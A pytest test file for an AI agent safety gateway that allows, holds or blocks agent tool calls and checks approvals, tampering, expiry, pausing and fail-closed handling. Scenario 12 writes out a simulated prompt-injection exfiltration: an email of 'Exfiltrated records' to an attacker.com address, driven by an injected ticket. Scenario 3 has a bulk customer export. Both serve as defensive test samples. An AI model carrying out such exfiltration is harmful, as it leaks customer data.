import pytest
import json
from unittest.mock import patch
from datetime import datetime, timedelta
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.db.session import SessionLocal
from app.models.safety import AgentModel, ActionModel, ApprovalModel, UntrustedContentModel
from app.services.policy_engine import compute_action_fingerprint

@pytest.mark.anyio
async def test_scenario_1_permitted_read_ticket_executes():
    """1. A permitted read_ticket action is allowed and executes its mock tool."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        payload = {
            "agent_id": "agent-demo",
            "session_id": "session-test-01",
            "tool_name": "read_ticket",
            "action_details": {"ticket_id": "TICKET-101"}
        }
        res = await client.post("/api/v1/tool_call", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["decision"] == "ALLOW"
        assert data["risk_tier"] in ("Tier 0", "Tier 1")
        assert data["execution_status"] == "EXECUTED"
        assert data["execution_result"] is not None
        assert data["execution_result"]["ticket_id"] == "TICKET-101"

@pytest.mark.anyio
async def test_scenario_2_unauthorized_email_is_held_or_blocked():
    """2. An unauthorized email is held or blocked according to policy and does not execute immediately."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        payload = {
            "agent_id": "agent-demo",
            "session_id": "session-test-02",
            "tool_name": "send_email",
            "action_details": {
                "to": "unauthorized-external@unknown-domain.xyz",
                "subject": "Sensitive Information",
                "body": "Confidential customer details"
            }
        }
        res = await client.post("/api/v1/tool_call", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["decision"] in ("HOLD", "BLOCK")
        assert data["execution_status"] != "EXECUTED"
        assert data["execution_result"] is None

@pytest.mark.anyio
async def test_scenario_3_prohibited_customer_export_blocked():
    """3. A prohibited customer-data export is blocked and does not execute."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        payload = {
            "agent_id": "agent-tool",
            "session_id": "session-test-03",
            "tool_name": "export_customers",
            "action_details": {"format": "csv", "filter": "all"}
        }
        res = await client.post("/api/v1/tool_call", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["decision"] == "BLOCK"
        assert data["risk_tier"] == "Tier X"
        assert data["execution_status"] == "BLOCKED"
        assert data["execution_result"] is None

@pytest.mark.anyio
async def test_scenario_4_refund_exceeding_limit_requires_approval():
    """4. A refund exceeding the configured limit ($100) requires approval (HOLD)."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # <= $100 should be allowed
        small_res = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-04a",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_1", "amount": 75.0}
        })
        assert small_res.status_code == 200
        assert small_res.json()["decision"] == "ALLOW"
        assert small_res.json()["execution_status"] == "EXECUTED"

        # > $100 should be placed on HOLD
        large_res = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-04b",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_2", "amount": 250.0}
        })
        assert large_res.status_code == 200
        assert large_res.json()["decision"] == "HOLD"
        assert large_res.json()["execution_status"] == "PENDING_APPROVAL"
        assert large_res.json()["fingerprint"] is not None

@pytest.mark.anyio
async def test_scenario_5_valid_approval_executes_exact_action():
    """5. A valid approval permits the exact approved mock action to execute once."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_call = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-05",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_approve_test", "amount": 180.0}
        })
        act_data = tool_call.json()
        action_id = act_data["action_id"]

        # Approve action
        decide_res = await client.post("/api/v1/decide", json={
            "action_id": action_id,
            "decision": "APPROVED",
            "reviewer_id": "reviewer-kavya",
            "reason": "Verified valid customer claim"
        })
        assert decide_res.status_code == 200
        decision_data = decide_res.json()
        assert decision_data["executed"] is True
        assert decision_data["status"] == "APPROVED"
        assert decision_data["execution_result"]["ledger_status"] == "POSTED"

@pytest.mark.anyio
async def test_scenario_6_tampering_invalidates_fingerprint():
    """6. Changing action details after approval invalidates the approval (fingerprint mismatch)."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_call = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-06",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_tamper", "amount": 220.0}
        })
        action_id = tool_call.json()["action_id"]

        # Simulate tampering directly in the database record behind the back of the approval
        db = SessionLocal()
        try:
            action = db.query(ActionModel).filter(ActionModel.id == action_id).first()
            tampered_details = {"customer_id": "cust_tamper", "amount": 9999.0}
            action.action_details = json.dumps(tampered_details)
            db.commit()
        finally:
            db.close()

        decide_res = await client.post("/api/v1/decide", json={
            "action_id": action_id,
            "decision": "APPROVED",
            "reviewer_id": "reviewer-kavya"
        })
        assert decide_res.status_code == 400
        assert "Fingerprint mismatch" in decide_res.json()["detail"]

@pytest.mark.anyio
async def test_scenario_7_expired_approvals_cannot_execute():
    """7. Expired approvals cannot execute."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_call = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-07",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_expire", "amount": 150.0}
        })
        action_id = tool_call.json()["action_id"]

        # Simulate expiration
        db = SessionLocal()
        try:
            approval = db.query(ApprovalModel).filter(ApprovalModel.action_id == action_id).first()
            approval.expires_at = datetime.utcnow() - timedelta(minutes=1)
            db.commit()
        finally:
            db.close()

        decide_res = await client.post("/api/v1/decide", json={
            "action_id": action_id,
            "decision": "APPROVED",
            "reviewer_id": "reviewer-kavya"
        })
        assert decide_res.status_code == 410
        assert "expired" in decide_res.json()["detail"].lower()

@pytest.mark.anyio
async def test_scenario_8_reusing_approval_fails():
    """8. Reusing an approval cannot execute the action again (single-use constraint)."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_call = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-08",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_reuse", "amount": 160.0}
        })
        action_id = tool_call.json()["action_id"]

        # First approval decision succeeds
        first_decide = await client.post("/api/v1/decide", json={
            "action_id": action_id,
            "decision": "APPROVED",
            "reviewer_id": "reviewer-kavya"
        })
        assert first_decide.status_code == 200

        # Second approval decision attempt fails
        second_decide = await client.post("/api/v1/decide", json={
            "action_id": action_id,
            "decision": "APPROVED",
            "reviewer_id": "reviewer-kavya"
        })
        assert second_decide.status_code in (400, 409)

@pytest.mark.anyio
async def test_scenario_9_rejecting_approval_prevents_execution():
    """9. Rejecting an approval prevents execution."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_call = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-tool",
            "session_id": "session-test-09",
            "tool_name": "issue_refund",
            "action_details": {"customer_id": "cust_reject", "amount": 290.0}
        })
        action_id = tool_call.json()["action_id"]

        decide_res = await client.post("/api/v1/decide", json={
            "action_id": action_id,
            "decision": "REJECTED",
            "reviewer_id": "reviewer-kavya",
            "reason": "Fraudulent request"
        })
        assert decide_res.status_code == 200
        data = decide_res.json()
        assert data["decision"] == "REJECTED"
        assert data["executed"] is False
        assert data["status"] == "BLOCKED"

@pytest.mark.anyio
async def test_scenario_10_paused_agent_cannot_execute():
    """10. A paused agent cannot execute a new action or pending approvals."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Pause demo agent
        pause_res = await client.post("/api/v1/agents/agent-demo/pause")
        assert pause_res.status_code == 200
        assert pause_res.json()["status"] == "PAUSED"

        # Try to execute action
        tool_res = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-demo",
            "session_id": "session-test-10",
            "tool_name": "read_ticket",
            "action_details": {"ticket_id": "TICKET-SAFE"}
        })
        assert tool_res.status_code == 200
        data = tool_res.json()
        assert data["decision"] == "BLOCK"
        assert data["risk_tier"] == "Tier X"
        assert "PAUSED" in data["reason"]

        # Resume demo agent with typed reason
        resume_res = await client.post("/api/v1/agents/agent-demo/resume", json={
            "reviewer_id": "reviewer-kavya",
            "reason": "Completed integrity check and confirmed safe state"
        })
        assert resume_res.status_code == 200
        assert resume_res.json()["status"] == "ACTIVE"

@pytest.mark.anyio
async def test_scenario_11_fail_closed_on_safety_failure():
    """11. An unavailable or faulty safety component causes fail-closed behavior."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_res = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-demo",
            "session_id": "session-test-11",
            "tool_name": "unknown_hazardous_tool",
            "action_details": {"param": "malicious"}
        })
        assert tool_res.status_code == 200
        data = tool_res.json()
        assert data["decision"] == "BLOCK"
        assert data["risk_tier"] == "Tier X"
        assert data["execution_status"] == "BLOCKED"

@pytest.mark.anyio
async def test_scenario_12_untrusted_content_influence_reflected():
    """12. Untrusted-content influence is reflected in the policy decision."""
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        tool_res = await client.post("/api/v1/tool_call", json={
            "agent_id": "agent-demo",
            "session_id": "session-test-12",
            "tool_name": "send_email",
            "action_details": {
                "to": "external-leak@attacker.com",
                "subject": "Exfiltrated records",
                "body": "Sensitive dumps"
            },
            "untrusted_content_ids": ["ticket-injection-01"]
        })
        assert tool_res.status_code == 200
        data = tool_res.json()
        assert data["decision"] == "BLOCK"
        assert data["risk_tier"] == "Tier X"
        assert "untrusted" in data["reason"].lower()

@pytest.mark.anyio
async def test_scenario_13_database_error_prevents_unauthorized_execution():
    """13. Database errors during evaluation do not cause unauthorized execution (fails closed)."""
    with patch("app.api.v1.gateway.evaluate_action", side_effect=Exception("Database connection timeout")):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            tool_res = await client.post("/api/v1/tool_call", json={
                "agent_id": "agent-demo",
                "session_id": "session-test-13",
                "tool_name": "issue_refund",
                "action_details": {"customer_id": "cust_err", "amount": 25.0}
            })
            assert tool_res.status_code == 200
            data = tool_res.json()
            assert data["decision"] == "BLOCK"
            assert data["risk_tier"] == "Tier X"
            assert data["execution_status"] == "BLOCKED"
            assert "fail-closed" in data["reason"]
